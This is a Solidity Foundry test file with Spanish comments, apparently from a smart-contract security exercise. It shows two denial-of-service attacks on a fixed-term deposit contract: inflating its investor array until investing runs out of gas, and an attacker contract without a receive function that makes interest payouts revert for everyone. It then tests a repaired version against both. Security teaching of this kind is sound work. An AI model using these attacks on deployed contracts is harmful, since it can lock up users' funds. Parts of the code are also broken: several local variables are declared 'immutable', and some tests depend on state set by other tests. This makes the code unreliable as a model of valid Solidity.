// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/dos_por_gas.sol";
import "../src/dos_por_gas_arreglado.sol";

contract plazo_fijo_test is Test {
    plazo_fijo instancia;
    address usuario_afectado = makeAddr("usuario");
    address banco = makeAddr("banco");
    uint256 cantidad_maxima_soporta_sin_limitar_gas;
    uint256 cantidad_maxima_soporta_limitando_gas;
    
    function setUp() public{
        vm.deal(usuario_afectado, 10 ether);
        vm.deal(banco, 10 ether);
    }

    /*En este test inflamos el arreglo interno de plazo_fijo con inversiones chicas, aumentando el costo en gas de cada nueva inversión por tener que iterar sobre el arreglo de inversores. Lo hacemos hasta que no nos queda suficiente gas como para permitir otra inversión. En ese caso es cuando un usuario legítimo si quisiera invertir debería realizar la transacción con mucho gas extra o que rechace por falta de gas.*/
    function test_dos_por_gas_sin_limitar_gas() public {
        address user;
        vm.prank(banco);
        instancia = new plazo_fijo{value: 10 ether}(2);
        uint256 gas_consumido_ultima_operacion = gasleft();
        uint256 i = 0;

        while (i == 0 || gas_consumido_ultima_operacion <= gasleft()) {
            user = makeAddr(vm.toString(i));
            vm.deal(user, 1 ether);
            uint256 gas_previo = gasleft();
            vm.prank(user);
            instancia.invertir{value: 1 ether}();
            gas_consumido_ultima_operacion = gas_previo - gasleft();
            i++;
        }
        cantidad_maxima_soporta_sin_limitar_gas = i;
        console.log("Tras ", i, " inversiones ya el costo de hacer que invierta el usuario_afectado es muy alto para el test y lo sera tambien para el que quiera invertir asi que si no pone muchisimo gas en la transaccion se va a revertir");
    }

    /*En este caso lo afrontamos de otro modo. Como los tests también tienen su cantidad de gas límite, no podemos permitir que estos se queden sin gas porque entonces rechazan siempre y no podemos hacer ningún assert ni nada, entonces ponemos un límite al gas de la operación de invertir menor al del test para asegurarnos que es esta la que se queda sin gas y no el test*/
    function test_dos_por_gas_limitando_gas() public {
        uint256 gasLimite = 500_000; // gas máximo que aceptamos pagar por invertir
        bytes memory data = abi.encodeCall(plazo_fijo.invertir, ());

        vm.prank(banco);
        instancia = new plazo_fijo{value: 10 ether}(2);

        uint256 i;
        bool ok = true;
        while (true && ok) {
            address user = makeAddr(vm.toString(i));
            vm.deal(user, 1 ether);
            vm.prank(user);
            (ok, ) = address(instancia).call{value: 1 ether, gas: gasLimite}(data);
            i++;
        }
        console.log("usuarios que lograron invertir antes del DoS:", i);
        cantidad_maxima_soporta_limitando_gas = i;
        uint256 antes = gasleft();
        vm.prank(usuario_afectado);
        (bool okAfectado, bytes memory ret) =
            address(instancia).call{value: 1 ether, gas: gasLimite}(data);
        uint256 gasUsado = antes - gasleft();

        //Chequeamos que haya revertido por quedarse sin gas
        assertEq(okAfectado, false);
        assertEq(ret.length, 0);
        assertEq(gasUsado > gasLimite, true);
        assertEq(usuario_afectado.balance, 10 ether); //No pudo invertir

        // Hacemos misma llamada pero con más gas para ver que falló por falta de este nomás
        vm.prank(usuario_afectado);
        (ok, ) = address(instancia).call{value: 10 ether, gas: 30_000_000}(data);
        assertEq(ok, true);
        assertEq(usuario_afectado.balance, 0 ether); //Ahora si que pudo invertir
}

    function test_dos_por_gas_sin_limitar_gas_para_fixed() public {
        address user;
        vm.prank(banco);
        plazo_fijo_arreglado arreglado = new plazo_fijo_arreglado{value: 10 ether}(2);
        uint256 gas_consumido_ultima_operacion = gasleft();
        uint256 i = 0;

        while ((i == 0 || gas_consumido_ultima_operacion <= gasleft()) && i <= cantidad_maxima_soporta_sin_limitar_gas) {
            user = makeAddr(vm.toString(i));
            vm.deal(user, 1 ether);
            uint256 gas_previo = gasleft();
            vm.prank(user);
            arreglado.invertir{value: 1 ether}();
            gas_consumido_ultima_operacion = gas_previo - gasleft();
            i++;
        }
        console.log("Tras ", i, " inversiones ya el costo de hacer que invierta el usuario_afectado es muy alto para el test y lo sera tambien para el que quiera invertir asi que si no pone muchisimo gas en la transaccion se va a revertir");
    }

    /*En este caso lo afrontamos de otro modo. Como los tests también tienen su cantidad de gas límite, no podemos permitir que estos se queden sin gas porque entonces rechazan siempre y no podemos hacer ningún assert ni nada, entonces ponemos un límite al gas de la operación de invertir menor al del test para asegurarnos que es esta la que se queda sin gas y no el test*/
    function test_dos_por_gas_limitando_gas_para_fixed() public {
        uint256 immutable gasLimite = 500_000; // gas máximo que aceptamos pagar por invertir
        bytes memory data = abi.encodeCall(plazo_fijo.invertir, ());

        vm.prank(banco);
        plazo_fijo_arreglado arreglado = new plazo_fijo_arreglado{value: 10 ether}(2);

        uint256 i;
        bool ok = true;
        while (true && ok && i <= cantidad_maxima_soporta_limitando_gas) {
            address user = makeAddr(vm.toString(i));
            vm.deal(user, 1 ether);
            vm.prank(user);
            (ok, ) = address(arreglado).call{value: 1 ether, gas: gasLimite}(data);
            i++;
        }
        console.log("usuarios que lograron invertir antes del DoS:", i);

        uint256 antes = gasleft();
        vm.prank(usuario_afectado);
        (bool okAfectado, bytes memory ret) =
            address(arreglado).call{value: 1 ether, gas: gasLimite}(data);
        uint256 gasUsado = antes - gasleft();

        //Chequeamos que haya revertido por quedarse sin gas
        assertEq(okAfectado, true);
        assertEq(usuario_afectado.balance, 9 ether); //Pudo invertir
}

    /*Este test busca demostrar otro tipo de DoS, en este caso si uno de los que depositó no implementa el receive ni el fallback se revierte, pero como el contrato requiere de haberle pagado a todos para terminar exitosamente, entonces revierte y nadie cobra*/
    function test_ataque_por_no_implementar_receive() public {
        vm.deal(banco, 10 ether);
        vm.prank(banco);
        plazo_fijo immutable plazo_fijo_DoS = new plazo_fijo{value: 10 ether}(2); 

        address usuario_legitimo_1 = makeAddr("usuario_legitimo_1");
        vm.deal(usuario_legitimo_1, 10 ether);
        address usuario_legitimo_2 = makeAddr("usuario_legitimo_2");
        vm.deal(usuario_legitimo_2, 10 ether);
         
        vm.prank(usuario_legitimo_1);
        plazo_fijo_DoS.invertir{value: 10 ether}();
        assertEq(usuario_legitimo_1.balance, 0 ether);

        ataque_DoS_por_no_receive immutable ataque = new ataque_DoS_por_no_receive(plazo_fijo_DoS);
        vm.deal(address(ataque), 10 ether);
        ataque.invertir();

        assertEq(address(ataque).balance, 0 ether);

        vm.prank(usuario_legitimo_2);
        plazo_fijo_DoS.invertir{value: 10 ether}();
        assertEq(usuario_legitimo_2.balance, 0 ether);

        vm.startPrank(banco);
        plazo_fijo_DoS.cerrar_incripcion();
        vm.expectRevert(plazo_fijo.Corralito.selector);
        plazo_fijo_DoS.devolver_intereses();
        vm.stopPrank();
        
        assertEq(usuario_legitimo_1.balance, 0 ether);
        assertEq(usuario_legitimo_2.balance, 0 ether);
        assertEq(address(ataque).balance, 0 ether);
    }

    //Para el arreglado
    function test_ataque_por_no_implementar_receive_fixed() public {
        vm.deal(banco, 10 ether);
        vm.prank(banco);
        plazo_fijo_arreglado immutable instancia_arreglada = new plazo_fijo_arreglado{value: 10 ether}(2); 

        address usuario_legitimo_1 = makeAddr("usuario_legitimo_1");
        vm.deal(usuario_legitimo_1, 10 ether);
        address usuario_legitimo_2 = makeAddr("usuario_legitimo_2");
        vm.deal(usuario_legitimo_2, 10 ether);
         
        vm.prank(usuario_legitimo_1);
        instancia_arreglada.invertir{value: 10 ether}();
        ataque_DoS_por_no_receive_fixed immutable ataque = new ataque_DoS_por_no_receive_fixed(instancia_arreglada);
        vm.deal(address(ataque), 10 ether);
        ataque.invertir();
        vm.prank(usuario_legitimo_2);
        instancia_arreglada.invertir{value: 10 ether}();
        
        assertEq(usuario_legitimo_1.balance, 0 ether);
        assertEq(address(ataque).balance, 0 ether);
        assertEq(usuario_legitimo_2.balance, 0 ether);
        
        vm.prank(banco);
        instancia_arreglada.cerrar_incripcion();
        
        vm.prank(usuario_legitimo_1);
        instancia_arreglada.devolver_intereses();

        vm.prank(usuario_legitimo_2);
        instancia_arreglada.devolver_intereses();

        assertEq(usuario_legitimo_1.balance, 20 ether);
        assertEq(usuario_legitimo_2.balance, 20 ether);
        assertEq(address(ataque).balance, 0 ether);   
    }
}


/*Tuvimos que hacer dos variantes solo por el tema del tipado, pero fuera de eso son lo mismo*/
contract ataque_DoS_por_no_receive {
    plazo_fijo immutable instancia;

    constructor(plazo_fijo plazo_fijo_a_atacar) payable{
        instancia = plazo_fijo_a_atacar;
    }

    function invertir() public {
        instancia.invertir{value: 10 ether}();
    }

}

contract ataque_DoS_por_no_receive_fixed {
    plazo_fijo_arreglado immutable instancia;

    constructor(plazo_fijo_arreglado plazo_fijo_a_atacar) payable{
        instancia = plazo_fijo_a_atacar;
    }

    function invertir() public {
        instancia.invertir{value: 10 ether}();
    }

}
